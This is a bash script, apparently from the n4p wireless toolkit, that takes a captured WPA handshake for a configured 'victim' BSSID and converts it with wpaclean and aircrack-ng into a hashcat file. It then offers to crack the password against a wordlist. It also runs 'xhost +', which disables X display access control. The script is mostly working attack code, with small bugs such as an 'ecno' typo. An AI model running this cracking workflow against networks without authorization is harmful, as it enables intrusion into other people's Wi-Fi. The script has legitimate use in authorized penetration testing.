#!/bin/bash
##############################################
# Do all prerun variables and safty measures #
# before anything else starts happening      #
##############################################
if [[ $(id -u) != 0 ]]; then # Verify we are root if not exit
   echo "Please Run This Script As Root or With Sudo!" 1>&2
   exit 1
fi

#retrieve absolute path structures so we can use symlinks and config files
SOURCE="${BASH_SOURCE[0]}"
while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
    DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
    SOURCE="$(readlink "$SOURCE")"
    [[ $SOURCE != /* ]] && SOURCE="${DIR}/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
done
DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
DIR_CONF=/etc/n4p
DIR_LOGO=/usr/share/n4p

#######################################
# Building a sane working environment #
#######################################
xhost +

sessionfolder=/tmp/n4p # Set our tmp working configuration directory

get_name() # Retrieve the config values
{
    USE=$(grep $1 ${DIR_CONF}/n4p.conf | awk -F= '{print $2}')
}

depends()
{
    get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
    get_name "HASHCAT_TYPE="; HASHCAT_TYPE=$USE
    get_name "HASHCAT_LOCATION="; HASHCAT_LOCATION=$USE
    get_name "HASHCAT_MODE="; HASHCAT_MODE=$USE
    get_name "WORD_LIST="; WORD_LIST=$USE
    get_name "HASHCAT_RULES="; HASHCAT_RULES=$USE
}

shallwecrack()
{
    read -p "Would you like to run Hashcat now? Y/N?" dohashcat
    if [[ $dohashcat == [yY] ]]; then
        hashcat
    elif [[ $dohashcat == [nN] ]]; then
        exit 0
    else
        echo "Hey there butterfinges"
        shallwecrack
    fi
}

hcap()
{
  if [[ -f ${sessionfolder}/${VICTIM_BSSID}-01.cap ]]; then
    wpaclean clean.cap ${sessionfolder}/${VICTIM_BSSID}-01.cap
    aircrack-ng -J "${sessionfolder}/${VICTIM_BSSID}-01.cap" "clean.cap" >> /dev/null
    rm ${sessionfolder}/clean.cap
    mv ${sessionfolder}/${VICTIM_BSSID}-01.cap.hccap ${sessionfolder}/${VICTIM_BSSID}.hccap
    echo "${sessionfolder}/${VICTIM_BSSID}.hccap created"
    shallwecrack
  elif [[ ! -f ${sessionfolder}/${VICTIM_BSSID}-01.cap ]]; then
      if [[ -f ${sessionfolder}/${VICTIM_BSSID}.hccap ]]; then
          ecno "${sessionfolder}/${VICTIM_BSSID}.hccap already exists"
          shallwecrack
      else
          echo "${sessionfolder}/${VICTIM_BSSID}-01.cap not found! Can't convert anything"
      fi
  fi
}

hashcat()
{
  ./${HASHCAT_TYPE}.bin ${HASHCAT_MODE} ${sessionfolder}/${VICTIM_BSSID}.hccap ${WORD_LIST} ${HASHCAT_RULES}
}
depends
hcap